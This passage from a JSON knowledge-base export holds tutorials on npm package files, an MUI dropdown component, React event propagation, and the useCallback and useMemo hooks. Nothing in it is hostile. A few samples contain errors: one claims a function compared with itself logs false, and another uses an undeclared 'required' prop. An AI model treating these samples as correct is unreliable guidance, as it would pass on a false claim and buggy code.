      "content": "# package.json and package-lock.json: A Concise Overview\n\n`package.json` and `package-lock.json` are key files in Node.js projects for managing dependencies, scripts, and project metadata. Understanding their roles is essential for reliable development and deployment.\n\n## Key Points\n\n- **package.json:** Defines project metadata, dependencies, scripts, and configuration.\n- **package-lock.json:** Records the exact dependency tree and versions installed, ensuring reproducible builds.\n- **Dependency Management:** Both files work together to manage and lock dependencies.\n- **Version Control:** `package.json` lists version ranges; `package-lock.json` locks specific versions.\n- **Collaboration:** Sharing both files helps teams avoid \\\"works on my machine\\\" issues.\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic package.json Example**\n   ```json\n   {\n     \"name\": \"my-app\",\n     \"version\": \"1.0.0\",\n     \"scripts\": {\n       \"start\": \"node index.js\"\n     },\n     \"dependencies\": {\n       \"express\": \"^4.18.2\"\n     }\n   }\n   ```\n\n2. **package-lock.json Example**\n   ```json\n   {\n     \"name\": \"my-app\",\n     \"lockfileVersion\": 2,\n     \"dependencies\": {\n       \"express\": {\n         \"version\": \"4.18.2\",\n         \"resolved\": \"https://registry.npmjs.org/express/-/express-4.18.2.tgz\"\n       }\n     }\n   }\n   ```\n\n3. **Installing Dependencies**\n   ```sh\n   npm install\n   # Installs dependencies and updates package-lock.json\n   ```\n\n## Common Pitfalls\n\n- Deleting or ignoring `package-lock.json` can lead to inconsistent environments.\n- Manually editing `package-lock.json` may break dependency resolution.\n- Not updating dependencies in `package.json` when required.\n\n## Practical Applications\n\n- Ensuring consistent dependency versions across development, CI, and production.\n- Managing scripts for build, test, and deployment.\n- Sharing project setup with collaborators.\n\n## References\n\n- [npm: package.json Documentation](https://docs.npmjs.com/cli/v10/configuring-npm/package-json)\n- [npm: package-lock.json Documentation](https://docs.npmjs.com/cli/v10/configuring-npm/package-lock-json)\n- [Node.js Guides: Working with package.json](https://nodejs.dev/en/learn/the-package-json-guide/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Semantic Versioning:** Use version ranges (`^`, `~`) in `package.json` for flexible updates.\n- **Lockfile Maintenance:** Use `npm ci` for clean, reproducible installs in CI environments.\n- **Monorepos:** Tools like `npm workspaces` and `yarn` use similar lockfile strategies for multi-package projects.\n- **Security Audits:** Run `npm audit` to check"
    },
    {
      "id": "swe/frontend/react/components/select-dropdown-react",
      "title": "Designing a Dropdown Component in React with MUI: A Well-Structured Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "components",
        "select-dropdown-react"
      ],
      "content": "# Designing a Dropdown Component in React with MUI: A Well-Structured Overview\n\nCreating a reusable dropdown component in React using Material-UI (MUI) involves leveraging MUI's built-in components like Select, Menu, and Autocomplete to build flexible, accessible, and visually consistent dropdowns that match your application's design system.\n\n## Key Points\n\n- **Definition:** A UI component that displays a collapsible list of options, allowing users to select one or multiple items from a predefined set.\n- **MUI Options:** MUI provides Select (form inputs), Menu (action lists), and Autocomplete (searchable dropdowns).\n- **Accessibility:** MUI components follow WAI-ARIA guidelines with keyboard navigation and screen reader support built-in.\n- **Customization:** Extensive theming via `sx` prop, styled components, and theme overrides for consistent branding.\n- **Controlled Components:** Manage state externally for complex logic and form integration.\n- **Variants:** Standard, outlined, and filled visual styles to match form aesthetics.\n- **Performance:** Virtualization support for large option lists through react-window integration.\n\n## Step-by-Step Explanation & Examples\n\n**Installing MUI**\n```bash\nnpm install @mui/material @emotion/react @emotion/styled\n```\n\n**Basic Reusable Dropdown Component**\n```jsx\nimport { FormControl, InputLabel, Select, MenuItem, FormHelperText } from '@mui/material';\n\nfunction Dropdown({ \n  label,           // Display label for the dropdown\n  options,         // Array of {value, label} objects\n  value,           // Currently selected value (controlled)\n  onChange,        // Handler function when selection changes\n  error,           // Boolean indicating validation error state\n  helperText,      // Helper/error text displayed below dropdown\n  disabled = false, // Disables user interaction\n  required = false, // Shows required indicator (*)\n  fullWidth = true  // Makes dropdown fill container width\n}) {\n  return (\n    <FormControl fullWidth={fullWidth} error={error} required={required}>\n      {/* InputLabel provides accessible label, id must match Select's labelId */}\n      <InputLabel id={`${label}-label`}>{label}</InputLabel>\n      \n      <Select\n        labelId={`${label}-label`}  // Links to InputLabel for accessibility\n        value={value}                 // Current selected value\n        label={label}                 // Required for proper outline behavior\n        onChange={onChange}           // Called with event.target.value\n        disabled={disabled}\n      >\n        {/* Map options to MenuItem components */}\n        {options.map((option) => (\n          <MenuItem \n            key={option.value}       // Unique key for React rendering\n            value={option.value}      // Value passed to onChange\n          >\n            {option.label}            {/* Display text */}\n          </MenuItem>\n        ))}\n      </Select>\n      \n      {/* Optional helper text for guidance or error messages */}\n      {helperText && <FormHelperText>{helperText}</FormHelperText>}\n    </FormControl>\n  );\n}\n\n// Usage Example\nfunction UserForm() {\n  const [country, setCountry] = useState('');\n  const [errors, setErrors] = useState({});\n\n  const countries = [\n    { value: 'us', label: 'United States' },\n    { value: 'ca', label: 'Canada' },\n    { value: 'mx', label: 'Mexico' }\n  ];\n\n  return (\n    <Dropdown\n      label=\"Country\"\n      options={countries}\n      value={country}\n      onChange={(e) => setCountry(e.target.value)}\n      error={!!errors.country}\n      helperText={errors.country || 'Select your country'}\n      required\n    />\n  );\n}\n```\n\n**Searchable Autocomplete Dropdown**\n```jsx\nimport { Autocomplete, TextField } from '@mui/material';\n\nfunction SearchableDropdown({\n  label,              // Display label\n  options,            // Array of objects to search/select from\n  value,              // Currently selected option object\n  onChange,           // Handler receiving (event, newValue)\n  getOptionLabel,     // Function to extract display string from option\n  loading = false,    // Shows loading indicator\n  disabled = false\n}) {\n  return (\n    <Autocomplete\n      options={options}              // Full array of selectable options\n      value={value}                  // Currently selected option (object, not string)\n      onChange={onChange}            // (event, newValue) => void\n      getOptionLabel={getOptionLabel} // (option) => string for display\n      loading={loading}              // Shows CircularProgress in dropdown\n      disabled={disabled}\n      isOptionEqualToValue={(option, value) => option.id === value.id} // Comparison logic\n      renderInput={(params) => (     // Customizes the input field\n        <TextField \n          {...params}                // Required: spreads autocomplete props\n          label={label}              \n          required={required}\n        />\n      )}\n    />\n  );\n}\n\n// Usage Example\nfunction CitySelector() {\n  const [city, setCity] = useState(null);\n\n  const cities = [\n    { id: 1, name: 'Los Angeles', state: 'CA' },\n    { id: 2, name: 'San Francisco', state: 'CA' },\n    { id: 3, name: 'New York', state: 'NY' }\n  ];\n\n  return (\n    <SearchableDropdown\n      label=\"City\"\n      options={cities}\n      value={city}\n      onChange={(event, newValue) => setCity(newValue)}\n      getOptionLabel={(option) => option.name}\n    />\n  );\n}\n```\n\n## Common Pitfalls\n\n- Forgetting to wrap Select with FormControl—breaks label positioning and accessibility.\n- Omitting the `label` prop on Select when using InputLabel—causes label overlap issues.\n- Not providing unique `key` props for MenuItem components.\n- Using incorrect value types—ensure value matches MenuItem value type.\n- Changing between controlled and uncontrolled patterns—always use controlled components with state.\n- Over-customizing native styles—breaks responsive behavior and accessibility.\n- Not handling empty/loading states in async scenarios.\n\n## Practical Applications\n\n- **Form Inputs:** Country selectors, category pickers, status dropdowns for data entry.\n- **Filters:** Multi-select filters for e-commerce products or data tables.\n- **User Selection:** Assign tasks, tag contacts, select recipients with search functionality.\n- **Settings:** Language selection, theme switching, timezone configuration.\n\n## References\n\n- [MUI Select Documentation](https://mui.com/material-ui/react-select/)\n- [MUI Autocomplete Documentation](https://mui.com/material-ui/react-autocomplete/)\n- [MUI Customization Guide](https://mui.com/material-ui/customization/how-to-customize/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Multi-Select:** Use `multiple` prop on Select with array values. Render chips with `renderValue`.\n- **Custom Styling:** Use `styled()` API or `sx` prop for theme-consistent customization without breaking accessibility.\n- **Form Integration:** Use Controller from react-hook-form for validation and state management.\n- **Virtualization:** Integrate react-window's FixedSizeList via `ListboxComponent` prop for 1000+ options.\n- **Async Loading:** Manage loading states with useEffect, fetch data on dropdown open event.\n- **Grouping:** Use `groupBy` prop in Autocomplete to organize options by categories.\n- **Icons in Options:** Add ListItemIcon components inside MenuItem for visual indicators.\n- **Native Select:** Use NativeSelect component for mobile-optimized OS pickers.\n- **Menu Alternative:** Button + Menu components for action dropdowns without form context.\n- **Validation:** Combine with form libraries, display errors via `error` and `helperText` props.\n- **Default Values:** Use `defaultValue` for uncontrolled or initial controlled state.\n- **Disabled Options:** Set `disabled` prop on individual MenuItem components.\n- **Custom Rendering:** Override `renderOption` in Autocomplete for rich option displays with subtitles or metadata."
    },
    {
      "id": "swe/frontend/react/event-handling",
      "title": "Event Handling and Interaction Precedence in UI Component Libraries",
      "path": [
        "swe",
        "frontend",
        "react",
        "event-handling"
      ],
      "content": "# Event Handling and Interaction Precedence in UI Component Libraries\n\nUnderstanding how events are handled and prioritized in nested UI components is crucial for building intuitive and bug-free interfaces.\n\n## Key Points\n\n- **Event Propagation:** Events bubble up from child to parent unless stopped.\n- **Default Behaviors:** Parent components may have default actions that can override or conflict with child events.\n- **Custom Handlers:** Use event methods (e.g., `stopPropagation`, `preventDefault`) to control event flow.\n- **Focus and Selection:** UI libraries often manage focus and selection, which can affect event handling.\n- **Accessibility:** Ensure custom event handling does not break keyboard or screen reader navigation.\n\n## Step-by-Step Explanation & Examples\n\n1. **Nested Event Example**\n   ```jsx\n   <Parent onClick={() => console.log('Parent clicked')}>\n     <Child onClick={e => {\n       e.stopPropagation();\n       console.log('Child clicked');\n     }} />\n   </Parent>\n   ```\n   - Clicking Child logs \"Child clicked\" only.\n\n2. **Overriding Default Behavior**\n   - Use `preventDefault` to stop default actions (e.g., form submission, dropdown closing).\n\n3. **Managing State**\n   - Update state in the correct component to reflect user actions.\n\n## Common Pitfalls\n\n- Not stopping propagation, causing unwanted parent actions.\n- Overriding default behaviors unintentionally.\n- Losing focus or selection state due to custom event handling.\n\n## Practical Applications\n\n- Custom dropdowns with removable selections.\n- Interactive lists or tag pickers.\n- Complex forms with nested controls.\n\n## References\n\n- [React Event Propagation](https://react.dev/reference/react-dom/components/common#event-propagation)\n- [MDN: Event Bubbling and Capturing](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Building_blocks/Events#event_bubbling_and_capture)\n- [MUI Event Handling](https://mui.com/material-ui/guides/events/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Event Delegation:** Attach handlers to parent elements for performance.\n- **Custom Event Systems:** Use context or state management for complex interactions.\n- **Testing Event Precedence:** Use testing libraries to verify correct event handling."
    },
    {
      "id": "swe/frontend/react/hooks/use-callback-hook",
      "title": "React useCallback Hook: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "hooks",
        "use-callback-hook"
      ],
      "content": "# React useCallback Hook: Complete Overview\n\n`useCallback` is a React hook that memoizes (caches) a function definition, returning the same function reference between renders unless dependencies change. Instead of creating a new function on every render, useCallback returns the cached function unless inputs change. Think of it as giving your function a permanent ID—even if you redecorate your house (re-render), the function stays the same person (same reference) unless you specifically change it.\n\n## Key Points\n\n- **Purpose:** Cache function references between renders\n- **Syntax:** `const memoizedFn = useCallback(() => doSomething(), [deps])`\n- **When:** Only creates new function when dependencies change\n- **Use Case:** Prevent unnecessary re-renders of child components that use React.memo\n- **Don't Overuse:** Has overhead, only use when needed for optimization\n\n## Basic Usage\n\n```javascript\nimport { useCallback } from 'react';\n\nfunction Component({ id }) {\n  // ❌ New function every render\n  const handleClick = () => {\n    console.log('Clicked', id);\n  };\n  \n  // ✅ Same function reference unless id changes\n  const handleClick = useCallback(() => {\n    console.log('Clicked', id);\n  }, [id]);\n  \n  return <button onClick={handleClick}>Click</button>;\n}\n```\n\n## When to Use useCallback\n\n### 1. Passing Callbacks to Memoized Children\n\n```javascript\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  const [text, setText] = useState('');\n  \n  // ❌ New function every render, child re-renders unnecessarily\n  const handleClick = () => {\n    console.log('Button clicked');\n  };\n  \n  // ✅ Same function reference, child only re-renders when needed\n  const handleClick = useCallback(() => {\n    console.log('Button clicked');\n  }, []); // No dependencies = never changes\n  \n  return (\n    <>\n      <input value={text} onChange={e => setText(e.target.value)} />\n      <p>Count: {count}</p>\n      <ExpensiveChild onClick={handleClick} />\n    </>\n  );\n}\n\nconst ExpensiveChild = React.memo(({ onClick }) => {\n  console.log('Child rendered'); // Only logs when onClick changes\n  return <button onClick={onClick}>Click Me</button>;\n});\n```\n\n### 2. Functions as Dependencies\n\n```javascript\nfunction SearchComponent({ initialQuery }) {\n  const [results, setResults] = useState([]);\n  \n  // ❌ fetchResults recreated every render, useEffect runs every render\n  const fetchResults = (query) => {\n    fetch(`/api/search?q=${query}`)\n      .then(res => res.json())\n      .then(setResults);\n  };\n  \n  useEffect(() => {\n    fetchResults(initialQuery);\n  }, [fetchResults]); // fetchResults changes = infinite loop!\n  \n  // ✅ fetchResults stable, useEffect runs only when initialQuery changes\n  const fetchResults = useCallback((query) => {\n    fetch(`/api/search?q=${query}`)\n      .then(res => res.json())\n      .then(setResults);\n  }, []); // No deps = function never changes\n  \n  useEffect(() => {\n    fetchResults(initialQuery);\n  }, [fetchResults, initialQuery]); // Safe now\n}\n```\n\n### 3. Event Handlers with Dependencies\n\n```javascript\nfunction TodoList({ todos, onToggle }) {\n  const [selectedId, setSelectedId] = useState(null);\n  \n  const handleToggle = useCallback((id) => {\n    console.log('Selected:', selectedId); // Uses selectedId\n    onToggle(id);\n  }, [selectedId, onToggle]); // Recreates when selectedId or onToggle changes\n  \n  return (\n    <ul>\n      {todos.map(todo => (\n        <TodoItem \n          key={todo.id} \n          todo={todo} \n          onToggle={handleToggle} \n        />\n      ))}\n    </ul>\n  );\n}\n\nconst TodoItem = React.memo(({ todo, onToggle }) => {\n  console.log('TodoItem rendered:', todo.id);\n  return (\n    <li onClick={() => onToggle(todo.id)}>\n      {todo.text}\n    </li>\n  );\n});\n```\n\n## When NOT to Use useCallback\n\n```javascript\n// ❌ Internal handlers (not passed to children)\nfunction Form() {\n  const handleSubmit = useCallback(() => {\n    console.log('Submitted');\n  }, []); // Unnecessary overhead\n  \n  return <form onSubmit={handleSubmit}>...</form>;\n}\n\n// ✅ Just use regular function\nfunction Form() {\n  const handleSubmit = () => {\n    console.log('Submitted');\n  };\n  \n  return <form onSubmit={handleSubmit}>...</form>;\n}\n\n// ❌ Child not memoized\nfunction Parent() {\n  const handleClick = useCallback(() => {\n    console.log('Clicked');\n  }, []); // Useless if Child isn't memoized\n  \n  return <Child onClick={handleClick} />;\n}\n\n// ❌ No dependencies\nconst handleClick = useCallback(() => {\n  doSomething();\n}, []); // Might as well define outside component\n\n// ✅ Define outside if no dependencies\nconst handleClick = () => doSomething();\n\nfunction Component() {\n  return <button onClick={handleClick}>Click</button>;\n}\n```\n\n## Common Patterns\n\n### Form Handlers\n\n```javascript\nfunction UserForm() {\n  const [formData, setFormData] = useState({ name: '', email: '' });\n  \n  const handleChange = useCallback((field) => (e) => {\n    setFormData(prev => ({ ...prev, [field]: e.target.value }));\n  }, []); // No dependencies, uses functional setState\n  \n  const handleSubmit = useCallback((e) => {\n    e.preventDefault();\n    console.log('Submitting:', formData);\n  }, [formData]); // Depends on formData\n  \n  return (\n    <form onSubmit={handleSubmit}>\n      <input value={formData.name} onChange={handleChange('name')} />\n      <input value={formData.email} onChange={handleChange('email')} />\n      <button type=\"submit\">Submit</button>\n    </form>\n  );\n}\n```\n\n### Debounced Functions\n\n```javascript\nfunction SearchInput() {\n  const [query, setQuery] = useState('');\n  const [results, setResults] = useState([]);\n  \n  const fetchResults = useCallback(async (searchQuery) => {\n    const res = await fetch(`/api/search?q=${searchQuery}`);\n    const data = await res.json();\n    setResults(data);\n  }, []);\n  \n  const debouncedFetch = useCallback(\n    debounce(fetchResults, 300),\n    [fetchResults]\n  );\n  \n  const handleChange = useCallback((e) => {\n    const value = e.target.value;\n    setQuery(value);\n    debouncedFetch(value);\n  }, [debouncedFetch]);\n  \n  return <input value={query} onChange={handleChange} />;\n}\n```\n\n### Event Listeners\n\n```javascript\nfunction ScrollTracker() {\n  const [scrollY, setScrollY] = useState(0);\n  \n  const handleScroll = useCallback(() => {\n    setScrollY(window.scrollY);\n  }, []); // No dependencies, uses setState\n  \n  useEffect(() => {\n    window.addEventListener('scroll', handleScroll);\n    return () => window.removeEventListener('scroll', handleScroll);\n  }, [handleScroll]); // handleScroll stable = no re-subscription\n  \n  return <div>Scroll position: {scrollY}</div>;\n}\n```\n\n### Callback Props Chain\n\n```javascript\nfunction GrandParent() {\n  const handleAction = useCallback((data) => {\n    console.log('Action:', data);\n  }, []);\n  \n  return <Parent onAction={handleAction} />;\n}\n\nconst Parent = React.memo(({ onAction }) => {\n  const handleClick = useCallback((id) => {\n    onAction({ id, timestamp: Date.now() });\n  }, [onAction]); // Depends on onAction\n  \n  return <Child onClick={handleClick} />;\n});\n\nconst Child = React.memo(({ onClick }) => {\n  return <button onClick={() => onClick('item-123')}>Click</button>;\n});\n```\n\n## useCallback vs useMemo\n\n```javascript\n// useCallback: Returns memoized function\nconst handleClick = useCallback(() => {\n  doSomething();\n}, [deps]);\n\n// useMemo: Returns memoized value\nconst value = useMemo(() => computeValue(), [deps]);\n\n// These are equivalent:\nuseCallback(fn, deps) === useMemo(() => fn, deps)\n\n// Example\nfunction Component({ data }) {\n  // Memoized function\n  const handleClick = useCallback(() => {\n    console.log('Clicked with', data);\n  }, [data]);\n  \n  // Memoized value\n  const processedData = useMemo(() => {\n    return data.map(item => item * 2);\n  }, [data]);\n  \n  // Equivalent to useCallback\n  const handleClick2 = useMemo(() => {\n    return () => console.log('Clicked with', data);\n  }, [data]);\n}\n```\n\n## Common Pitfalls\n\n```javascript\n// ❌ Missing dependencies\nconst handleClick = useCallback(() => {\n  console.log(count); // Stale count\n}, []); // Should include [count]\n\n// ❌ Inline object/array in dependency\nconst handleSubmit = useCallback(() => {\n  submitForm(formData);\n}, [{ name: 'John' }]); // New object every render = always new function\n\n// ❌ Using without React.memo\nfunction Parent() {\n  const handleClick = useCallback(() => {}, []); // Pointless\n  return <Child onClick={handleClick} />; // Child not memoized\n}\n\n// ✅ With React.memo\nconst Child = React.memo(({ onClick }) => <button onClick={onClick}>Click</button>);\n\n// ❌ Overusing for every function\nconst a = useCallback(() => {}, []);\nconst b = useCallback(() => {}, []);\nconst c = useCallback(() => {}, []);\n// Only use when passing to memoized children or as effect dependencies\n\n// ❌ Dependencies change every render\nconst obj = { id: 1 }; // New object every render\nconst handleClick = useCallback(() => {\n  doSomething(obj);\n}, [obj]); // Always creates new function\n\n// ✅ Stable dependency\nconst obj = useMemo(() => ({ id: 1 }), []);\nconst handleClick = useCallback(() => {\n  doSomething(obj);\n}, [obj]);\n```\n\n## Decision Guide\n\n```\nUse useCallback when:\n✅ Passing function to React.memo component\n✅ Function is dependency of useEffect/useMemo\n✅ Passing to child that uses it in its own hooks\n✅ Creating custom hooks that return callbacks\n✅ Preventing expensive child re-renders\n\nDon't use useCallback when:\n❌ Function only used internally (onClick on div/button)\n❌ Child component not memoized\n❌ Function has no dependencies (define outside component)\n❌ Premature optimization (measure first!)\n❌ Creating callbacks for every single function\n```\n\n## Quick Example: Before/After\n\n```javascript\n// Before: Child re-renders unnecessarily\nfunction TodoApp() {\n  const [todos, setTodos] = useState([]);\n  const [filter, setFilter] = useState('all');\n  \n  const handleToggle = (id) => {\n    setTodos(todos.map(t => \n      t.id === id ? { ...t, done: !t.done } : t\n    ));\n  };\n  \n  return (\n    <>\n      <FilterBar onFilterChange={setFilter} />\n      <TodoList todos={todos} onToggle={handleToggle} />\n    </>\n  );\n}\n// Every filter change re-creates handleToggle, TodoList re-renders\n\n// After: Child only re-renders when todos change\nfunction TodoApp() {\n  const [todos, setTodos] = useState([]);\n  const [filter, setFilter] = useState('all');\n  \n  const handleToggle = useCallback((id) => {\n    setTodos(prev => prev.map(t => \n      t.id === id ? { ...t, done: !t.done } : t\n    ));\n  }, []); // No dependencies with functional setState\n  \n  return (\n    <>\n      <FilterBar onFilterChange={setFilter} />\n      <TodoList todos={todos} onToggle={handleToggle} />\n    </>\n  );\n}\n\nconst TodoList = React.memo(({ todos, onToggle }) => {\n  console.log('TodoList rendered');\n  return <ul>{todos.map(t => <TodoItem key={t.id} todo={t} onToggle={onToggle} />)}</ul>;\n});\n```\n\n## Performance Measurement\n\n```javascript\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  // Without useCallback\n  const handleClick1 = () => console.log('Clicked');\n  \n  // With useCallback\n  const handleClick2 = useCallback(() => console.log('Clicked'), []);\n  \n  // Compare references\n  console.log(handleClick1 === handleClick1); // false (new each render)\n  console.log(handleClick2 === handleClick2); // true (same reference)\n  \n  return (\n    <>\n      <button onClick={() => setCount(count + 1)}>Count: {count}</button>\n      <MemoizedChild onClick={handleClick2} />\n    </>\n  );\n}\n```\n\n## With Custom Hooks\n\n```javascript\n// Custom hook returning callback\nfunction useApi() {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(false);\n  \n  const fetchData = useCallback(async (endpoint) => {\n    setLoading(true);\n    const res = await fetch(endpoint);\n    const json = await res.json();\n    setData(json);\n    setLoading(false);\n  }, []); // Stable function\n  \n  return { data, loading, fetchData };\n}\n\n// Usage\nfunction UserProfile({ userId }) {\n  const { data, loading, fetchData } = useApi();\n  \n  useEffect(() => {\n    fetchData(`/api/users/${userId}`);\n  }, [userId, fetchData]); // fetchData stable, only runs when userId changes\n  \n  if (loading) return <div>Loading...</div>;\n  return <div>{data?.name}</div>;\n}\n```\n\n## References\n\n- [React Docs: useCallback](https://react.dev/reference/react/useCallback)\n- [React Docs: React.memo](https://react.dev/reference/react/memo)\n- [When to useCallback](https://kentcdodds.com/blog/usememo-and-usecallback)\n\n---\n\n## Summary\n\n**useCallback in one line:** Cache function references to prevent child re-renders\n\n**Syntax:**\n```javascript\nconst memoizedFn = useCallback(() => doSomething(a, b), [a, b]);\n```\n\n**Equivalent to:**\n```javascript\nconst memoizedFn = useMemo(() => () => doSomething(a, b), [a, b]);\n```\n\n**Rule of thumb:** Only use when passing to React.memo children or as effect dependencies. Profile first, optimize second."
    },
    {
      "id": "swe/frontend/react/hooks/use-memo-hook",
      "title": "React useMemo Hook: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "hooks",
        "use-memo-hook"
      ],
      "content": "# React useMemo Hook: Complete Overview\n\n`useMemo` is a React hook that memoizes (caches) the result of an expensive computation, only recalculating when dependencies change. Instead of running expensive calculations on every render, useMemo returns the cached result unless inputs change. Think of it as a smart calculator that remembers previous answers—if you ask \"what's 2+2?\" again, it just says \"4\" without recalculating.\n\n## Key Points\n\n- **Purpose:** Cache expensive computation results between renders\n- **Syntax:** `const result = useMemo(() => expensiveFunc(), [deps])`\n- **When:** Only recalculates when dependencies change\n- **Use Case:** Optimize performance for slow calculations or prevent referential inequality\n- **Don't Overuse:** Has overhead, only use for actual performance issues\n\n## Basic Usage\n\n```javascript\nimport { useMemo } from 'react';\n\nfunction Component({ numbers }) {\n  // Without useMemo: Runs on every render\n  const sum = numbers.reduce((a, b) => a + b, 0);\n  \n  // With useMemo: Only recalculates when numbers changes\n  const sum = useMemo(() => {\n    return numbers.reduce((a, b) => a + b, 0);\n  }, [numbers]);\n  \n  return <div>Sum: {sum}</div>;\n}\n```\n\n## When to Use useMemo\n\n### 1. Expensive Calculations\n\n```javascript\nfunction ProductList({ products, searchTerm }) {\n  // ❌ Filters on every render (even if searchTerm unchanged)\n  const filtered = products.filter(p => \n    p.name.toLowerCase().includes(searchTerm.toLowerCase())\n  );\n  \n  // ✅ Only filters when products or searchTerm changes\n  const filtered = useMemo(() => {\n    console.log('Filtering...'); // Only logs when recalculating\n    return products.filter(p => \n      p.name.toLowerCase().includes(searchTerm.toLowerCase())\n    );\n  }, [products, searchTerm]);\n  \n  return <ul>{filtered.map(p => <li key={p.id}>{p.name}</li>)}</ul>;\n}\n```\n\n### 2. Referential Equality\n\n```javascript\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  // ❌ New array every render, child re-renders unnecessarily\n  const items = [1, 2, 3];\n  \n  // ✅ Same array reference unless dependencies change\n  const items = useMemo(() => [1, 2, 3], []);\n  \n  return (\n    <>\n      <button onClick={() => setCount(count + 1)}>Count: {count}</button>\n      <ExpensiveChild items={items} />\n    </>\n  );\n}\n\nconst ExpensiveChild = React.memo(({ items }) => {\n  console.log('Child rendered'); // Only logs when items reference changes\n  return <ul>{items.map(i => <li key={i}>{i}</li>)}</ul>;\n});\n```\n\n### 3. Derived State\n\n```javascript\nfunction ShoppingCart({ items }) {\n  const total = useMemo(() => {\n    return items.reduce((sum, item) => sum + item.price * item.quantity, 0);\n  }, [items]);\n  \n  const itemCount = useMemo(() => {\n    return items.reduce((count, item) => count + item.quantity, 0);\n  }, [items]);\n  \n  const tax = useMemo(() => total * 0.1, [total]);\n  \n  return (\n    <div>\n      <p>Items: {itemCount}</p>\n      <p>Subtotal: ${total}</p>\n      <p>Tax: ${tax}</p>\n      <p>Total: ${total + tax}</p>\n    </div>\n  );\n}\n```\n\n## When NOT to Use useMemo\n\n```javascript\n// ❌ Simple calculations (useMemo overhead worse than calculation)\nconst doubled = useMemo(() => count * 2, [count]);\nconst doubled = count * 2; // ✅ Just calculate it\n\n// ❌ Primitives (already compared by value)\nconst text = useMemo(() => 'Hello', []);\nconst text = 'Hello'; // ✅ No benefit\n\n// ❌ Every single computation (premature optimization)\nconst a = useMemo(() => x + y, [x, y]);\nconst b = useMemo(() => a * 2, [a]);\nconst c = useMemo(() => b - 5, [b]);\n// ✅ Only memoize if there's a proven performance issue\n```\n\n## Common Patterns\n\n### Filtering Large Lists\n\n```javascript\nfunction UserTable({ users, searchTerm, filters }) {\n  const filteredUsers = useMemo(() => {\n    return users\n      .filter(u => u.name.includes(searchTerm))\n      .filter(u => filters.active ? u.isActive : true)\n      .filter(u => filters.role ? u.role === filters.role : true)\n      .sort((a, b) => a.name.localeCompare(b.name));\n  }, [users, searchTerm, filters]);\n  \n  return (\n    <table>\n      {filteredUsers.map(u => <UserRow key={u.id} user={u} />)}\n    </table>\n  );\n}\n```\n\n### Complex Object Creation\n\n```javascript\nfunction Chart({ data }) {\n  const chartConfig = useMemo(() => ({\n    type: 'line',\n    data: {\n      labels: data.map(d => d.date),\n      datasets: [{\n        label: 'Sales',\n        data: data.map(d => d.amount),\n        borderColor: 'rgb(75, 192, 192)'\n      }]\n    },\n    options: {\n      responsive: true,\n      plugins: { legend: { position: 'top' } }\n    }\n  }), [data]);\n  \n  return <LineChart config={chartConfig} />;\n}\n```\n\n### Sorted/Grouped Data\n\n```javascript\nfunction ProductCatalog({ products }) {\n  const groupedByCategory = useMemo(() => {\n    return products.reduce((groups, product) => {\n      const category = product.category;\n      if (!groups[category]) groups[category] = [];\n      groups[category].push(product);\n      return groups;\n    }, {});\n  }, [products]);\n  \n  return (\n    <div>\n      {Object.entries(groupedByCategory).map(([category, items]) => (\n        <div key={category}>\n          <h2>{category}</h2>\n          <ul>{items.map(p => <li key={p.id}>{p.name}</li>)}</ul>\n        </div>\n      ))}\n    </div>\n  );\n}\n```\n\n## useMemo vs useCallback\n\n```javascript\n// useMemo: Memoizes VALUE\nconst memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);\n\n// useCallback: Memoizes FUNCTION\nconst memoizedCallback = useCallback(() => doSomething(a, b), [a, b]);\n\n// These are equivalent:\nconst memoizedCallback = useCallback(fn, deps);\nconst memoizedCallback = useMemo(() => fn, deps);\n\n// Example\nfunction Parent() {\n  // Memoized value\n  const sortedItems = useMemo(() => items.sort(), [items]);\n  \n  // Memoized function\n  const handleClick = useCallback(() => {\n    console.log('Clicked');\n  }, []);\n  \n  return <Child items={sortedItems} onClick={handleClick} />;\n}\n```\n\n## Performance Measurement\n\n```javascript\nfunction ExpensiveComponent({ data }) {\n  // Measure without useMemo\n  console.time('calculation');\n  const result = expensiveCalculation(data);\n  console.timeEnd('calculation');\n  \n  // Measure with useMemo\n  const result = useMemo(() => {\n    console.time('memoized calculation');\n    const r = expensiveCalculation(data);\n    console.timeEnd('memoized calculation');\n    return r;\n  }, [data]);\n  \n  // First render: Both take ~100ms\n  // Subsequent renders (same data):\n  // - Without: 100ms every time\n  // - With: <1ms (cached)\n}\n```\n\n## Common Pitfalls\n\n```javascript\n// ❌ Missing dependencies\nconst value = useMemo(() => a + b, [a]); // Stale 'b'\n\n// ❌ Dependencies change too often\nconst value = useMemo(() => compute(obj), [obj]); // New object every render\n\n// ❌ Unnecessary memoization\nconst doubled = useMemo(() => count * 2, [count]); // Overkill\n\n// ❌ Inline objects in dependency array\nconst value = useMemo(() => process(config), [{ x: 1 }]); // New object = always recalculate\n\n// ✅ Stable dependency\nconst config = useMemo(() => ({ x: 1 }), []);\nconst value = useMemo(() => process(config), [config]);\n```\n\n## Decision Guide\n\n```\nUse useMemo when:\n✅ Calculation is expensive (>50ms)\n✅ Filtering/sorting large arrays (1000+ items)\n✅ Creating objects/arrays passed to React.memo children\n✅ Complex derived state\n✅ Proven performance bottleneck\n\nDon't use useMemo when:\n❌ Simple arithmetic (x + y, count * 2)\n❌ Creating primitives (strings, numbers, booleans)\n❌ No performance issue (measure first!)\n❌ Dependencies change every render anyway\n```\n\n## Quick Example: Before/After\n\n```javascript\n// Before: Slow on every render\nfunction SearchResults({ items, query }) {\n  const results = items\n    .filter(item => item.name.includes(query))\n    .map(item => ({ ...item, score: calculateScore(item, query) }))\n    .sort((a, b) => b.score - a.score);\n  \n  return <List items={results} />;\n}\n\n// After: Fast unless items or query changes\nfunction SearchResults({ items, query }) {\n  const results = useMemo(() => {\n    return items\n      .filter(item => item.name.includes(query))\n      .map(item => ({ ...item, score: calculateScore(item, query) }))\n      .sort((a, b) => b.score - a.score);\n  }, [items, query]);\n  \n  return <List items={results} />;\n}\n```\n\n## 